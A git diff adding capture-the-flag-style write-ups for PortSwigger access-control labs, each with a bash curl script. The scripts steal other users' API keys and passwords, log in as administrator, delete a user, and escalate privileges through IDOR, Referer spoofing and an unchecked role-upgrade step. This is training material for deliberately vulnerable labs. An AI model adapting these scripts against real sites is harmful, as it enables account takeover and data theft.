@@ -457,7 +457,7 @@ Drop support for `X-Original-URL` header.
 
 **Vulnerability**
 
-Broken access control for `GET` http metchod.
+Broken access control for `GET` http method.
 
 **Exploitation**
 
@@ -515,6 +515,193 @@ KEY=$(curl -s -k -x 127.0.0.1:8081 $URL/my-account?id=$GUID | grep 'API Key' | c
 
 # submit solution:
 curl -k -x 127.0.0.1:8081 $URL/submitSolution -d "answer=$KEY"
+
+EOF
+```
+
+**Mitigation**
+
+
+### Lab: User ID controlled by request parameter with data leakage in redirect
+
+**Target**
+
+    https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect
+
+**Vulnerability**
+
+Badly implemented redirect to `/login` form. API key is revealed in the response just before redirect.
+
+**Exploitation**
+
+```
+cat > labSolution-User-ID-controlled-by-request-parameter-with-data-leakage-in-redirect.sh <<'EOF'
+#!/bin/bash
+
+URL=https://ac491f001f68727ec11f7815009d002c.web-security-academy.net
+
+# get carlos API key:
+KEY=$(curl -s -k $URL/my-account?id=carlos | grep 'API Key' | cut -d'<' -f2 | awk -F' ' '{print $NF}')
+
+# submit solution:
+curl -k $URL/submitSolution -d "answer=$KEY"
+
+EOF
+```
+
+**Mitigation**
+
+Fix the redirect.
+
+### Lab: User ID controlled by request parameter with password disclosure
+
+**Target**
+
+    https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure
+
+**Vulnerability**
+
+No access control at all! Password for every user can be anonymously read by enumerating `id` parameter at `/my-account` page.
+
+**Exploitation**
+
+```
+cat > labSolution-User-ID-controlled-by-request-parameter-with-password-disclosure.sh <<'EOF'
+#!/bin/bash
+
+URL=https://aca21fa81e97e6ebc07e978f000c0088.web-security-academy.net
+PROXY=127.0.0.1:8081
+
+# create initial (anonymous) session
+curl -s -c cookies.jar $URL
+
+# get administrator password
+PASSWD=$(curl -b cookies.jar -k -x $PROXY -s $URL/my-account?id=administrator | grep 'name=password' | cut -d"'" -f2)
+
+# get CSRF token:
+CSRF=$(curl -k -b cookies.jar -x $PROXY -s $URL/login | grep csrf | cut -d'"' -f6)
+
+# log in via administrator:
+curl -k -x $PROXY -b cookies.jar -s $URL/login -d "csrf=$CSRF&username=administrator&password=$PASSWD"
+
+# delete carlos user:
+curl -L -k -x $PROXY -b cookies.jar $URL/admin/delete?username=carlos
+
+EOF
+```
+
+**Mitigation**
+
+Fix that.
+
+### Lab: Insecure direct object references
+
+**Target**
+
+    https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references
+
+**Vulnerability**
+
+IDOR. Unprotected access to `/download-transcript/$i.txt` files.
+
+**Exploitation**
+
+Exploit:
+
+```
+cat > labSolution-Insecure-direct-object-references.sh <<'EOF'
+#!/bin/bash
+
+URL=https://ac991fdf1e5eb44fc02c03b4002d00b6.web-security-academy.net
+PROXY=127.0.0.1:8081
+
+# create initial (anonymous) session
+curl -s -c cookies.jar $URL
+
+# get carlos password:
+PASSWD=$(for i in $(seq 1 5); do curl -b cookies.jar -s $URL/download-transcript/$i.txt; done | grep 'password is' | cut -d'.' -f1 | awk '{print $NF}')
+
+# get CSRF token:
+CSRF=$(curl -x $PROXY -k -b cookies.jar -x $PROXY -s $URL/login | grep csrf | cut -d'"' -f6)
+
+# log in as carlos:
+curl -L -k -x $PROXY -b cookies.jar -s $URL/login -d "csrf=$CSRF&username=carlos&password=$PASSWD"
+
+EOF
+```
+
+**Mitigation**
+
+Only allow authenticated users to view logs.
+
+### Lab: Multi-step process with no access control on one step
+
+**Target**
+
+    https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step
+
+**Vulnerability**
+
+2nd step of upgrading the privileges is broken and does not require admin's permissions.
+
+**Exploitation**
+
+Exploit:
+
+```
+cat > labSolution-Multi-step-process-with-no-access-control-on-one-step.sh <<'EOF'
+#!/bin/bash
+
+URL=https://ac771fbe1fd10067c07a21b0005e00fd.web-security-academy.net
+PROXY=127.0.0.1:8081
+
+# create initial (anonymous) session
+curl -s -c cookies.jar $URL
+
+# get CSRF token:
+CSRF=$(curl -x $PROXY -k -b cookies.jar -x $PROXY -s $URL/login | grep csrf | cut -d'"' -f6)
+
+# log in as wiener:
+curl -L -k -x $PROXY -b cookies.jar -s $URL/login -d "csrf=$CSRF&username=wiener&password=peter"
+
+curl -k -x $PROXY -b cookies.jar $URL/admin-roles -d "action=upgrade&username=wiener&confirmed=true"
+
+EOF
+```
+
+**Mitigation**
+
+Verify permissions at each stage of multi-step process.
+
+### Lab: Referer-based access control
+
+**Target**
+
+    https://portswigger.net/web-security/access-control/lab-referer-based-access-control
+
+**Vulnerability**
+
+**Exploitation**
+
+Exploit:
+
+```
+cat > labSolution-Referer-based-access-control.sh <<'EOF'
+#!/bin/bash
+
+URL=https://acf51f5f1f5a219bc085490e00580073.web-security-academy.net
+PROXY=127.0.0.1:8081
+
+# create initial (anonymous) session
+curl -s -c cookies.jar $URL
+
+# get CSRF token:
+CSRF=$(curl -x $PROXY -k -b cookies.jar -x $PROXY -s $URL/login | grep csrf | cut -d'"' -f6)
+
+# log in as wiener:
+curl -L -k -x $PROXY -c cookies.jar -s $URL/login -d "csrf=$CSRF&username=wiener&password=peter"
+
+curl -L -H "Referer: $URL/admin" -k -x $PROXY -b cookies.jar "$URL/admin-roles?username=wiener&action=upgrade"
 
 EOF
 ```
